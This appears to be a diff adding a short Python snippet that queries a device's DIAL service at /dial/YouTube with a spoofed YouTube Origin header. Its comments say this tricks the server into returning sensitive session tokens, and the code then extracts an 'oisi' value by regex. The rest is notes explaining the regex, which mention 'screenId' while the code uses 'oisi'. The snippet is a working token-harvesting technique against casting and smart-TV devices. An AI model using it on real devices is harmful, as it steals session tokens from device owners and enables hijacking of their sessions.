@@ -1,0 +1,25 @@
+# THE BELOW IS A SIMPLE QUERY WITH ORIGIN SET AS YOUTUBE, 
+# THEREFORE TRICKING THE DIAL SERVER INTO THINKING THE REQUEST IS COMING FROM YOUTUBE,
+# WHICH RESULTS IN SERVER GIVING MORE THEN JUST A SIMPLE DIAL RESPONSE BUT AN ADDITIONAL DATABLOCK THAT GIVES SENSITIVE SESSION TOKENS
+
+url = f"http://{ip}:{port}/dial/YouTube"
+response = requests.get(url=url, headers={"Origin":"https://www.youtube.com"}, timeout=5)
+
+if not response: return False
+
+
+text = response.text
+
+oisi = re.search(string=text, pattern=r"<oisi>([^<]+)</oisi>").group(1)
+
+
+
+# HOW REGEX WORKS - HAD TO PRACTICE THIS A BIT AS ITS BEEN A WHILE // LOLOLOLOL
+- <screenId>  = match this exact text
+- (           = start capturing (what you want to extract)
+- [^<]        = match any character that is NOT <
+- +           = one or more of those characters
+- )           = stop capturing
+- </screenId> = match this exact text
+- .group(0)   = the entire match
+- .group(1)   = just whats in the capture ()
